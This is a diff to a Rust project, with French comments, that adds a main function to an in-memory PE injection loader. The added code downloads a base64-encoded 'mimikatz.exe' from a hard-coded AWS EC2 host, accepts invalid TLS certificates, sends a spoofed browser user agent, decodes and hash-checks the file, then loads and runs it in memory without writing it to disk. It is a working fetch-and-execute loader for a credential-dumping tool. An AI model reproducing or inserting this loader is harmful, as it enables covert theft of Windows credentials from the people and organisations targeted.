@@ -1,13 +1,16 @@
 #![allow(unused_assignments)]
 
+mod utils;
+mod cmd;
+
 use {
-    //super::cmd::Args,
-    //clap::Parser,
+    cmd::Args,
+    clap::Parser,
     std::{
         ptr::null_mut, ffi::{c_void, CStr},
         mem::{size_of, transmute},
     },
-    super::utils::{
+    utils::{
         image_ordinal, image_snap_by_ordinal, get_peb,
         Dll, Exe, BASE_RELOCATION_ENTRY, PE,
     },   
@@ -28,10 +31,36 @@ use windows::{
     },
 };
 
-// TODO, ici en paramètre, on donne le type (exe/dll) et ensuite le vec_u8 et la cmdline -> qui sera Args::parsel
-pub fn local_pe_injection(param:String,export:String,data:Vec<u8>) -> Result<(), Box<dyn std::error::Error>> {
-    //let args = ArgsLocalPe::parse();
-    /* 
+
+use attohttpc::header;
+use std::io::Read;
+use base64::prelude::*;
+use anyhow::bail;
+use chksum_sha2_512 as sha2_512;
+fn download_data(url:&str) -> Result<Vec<u8>, anyhow::Error> {
+    let build: attohttpc::RequestBuilder = attohttpc::get(url).danger_accept_invalid_certs(true).header(header::USER_AGENT, "Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0");
+    let mut response = build.send()?;
+    let mut data: Vec<u8> = Vec::new();
+    response.read_to_end(&mut data)?;
+    Ok(data)
+}
+fn check_sha512(hash: &str, data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
+    println!("dataoperation: SHA512 verify: {}",hash);
+    let digest: chksum_sha2_512::Digest = sha2_512::chksum(data.clone())?;
+    let digest_lowercase = digest.to_hex_lowercase();
+    if digest_lowercase == hash {
+        Ok(data)
+    } else {
+        bail!("\ndataoperation: SHA512 verify FAILED\nexpected: {}\nfound:    {}", hash,digest_lowercase)
+    }
+}
+
+
+
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+
+    let args = Args::parse();
+    /*
     let path = std::path::Path::new(&args.pe);
 
     let (param, export) = match path.extension().and_then(|ext| ext.to_str()) {
@@ -42,15 +71,16 @@ pub fn local_pe_injection(param:String,export:String,data:Vec<u8>) -> Result<(),
             return Ok(())
         }
     };
-
-    let buffer = std::fs::read(&args.pe).map_err(|e| format!("Error reading PE file: {e}"))?;
-    let mut pe = initialize_pe(buffer)?;
-    // Load the executable or DLL
-    //load_exe(&mut pe, param, export)?;
     */
 
+    let mut data =  download_data("https://ec2-35-181-49-245.eu-west-3.compute.amazonaws.com/mimikatz.exe.b64").unwrap();
+    data = BASE64_STANDARD.decode(data).unwrap();
+    data = check_sha512("f00b1ab035aa574c70f6b95b63f676fa75ff8f379f92e85ad5872c358a6bb1ed5417fdd226d421307a48653577ca42aba28103b3b2d7a5c572192d6e5f07e8b3",data).unwrap();
+
+
+    // Load the executable or DLL
     let mut pe = initialize_pe(data)?;
-    load_exe(&mut pe, param, export)?;
+    load_exe(&mut pe, args.arg.clone().unwrap_or_default(), String::new())?;
 
     Ok(())
 }
